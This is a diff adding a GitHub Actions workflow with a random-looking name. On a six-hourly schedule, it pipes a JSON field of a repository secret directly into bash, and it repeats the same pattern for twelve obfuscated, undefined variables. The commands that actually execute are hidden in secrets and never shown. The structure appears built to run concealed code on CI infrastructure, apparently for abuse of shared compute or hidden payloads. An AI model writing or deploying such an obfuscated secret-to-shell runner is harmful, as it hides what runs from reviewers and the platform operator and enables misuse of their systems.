@@ -1,0 +1,29 @@
+name: xuntianzong2387
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuntianzong2387
+        env:
+          kbl2: ${{ secrets.kbl2 }}
+        run: |
+          echo $kbl2 | jq -r .nmzh9 | /bin/bash
+          echo $sgo96943 | jq -r .nos190 | /bin/bash
+          echo $qn12 | jq -r .bmle19 | /bin/bash
+          echo $wcf777 | jq -r .g7020 | /bin/bash
+          echo $h5 | jq -r .pk038 | /bin/bash
+          echo $nprur1 | jq -r .nmqzo22 | /bin/bash
+          echo $d07 | jq -r .cft93 | /bin/bash
+          echo $slq3990 | jq -r .d4715 | /bin/bash
+          echo $exey15710 | jq -r .asfgl200 | /bin/bash
+          echo $p7 | jq -r .our0596 | /bin/bash
+          echo $hb5484 | jq -r .yjt0 | /bin/bash
+          echo $cqpew674 | jq -r .e758 | /bin/bash
+          echo $h48805 | jq -r .udd47 | /bin/bash
+
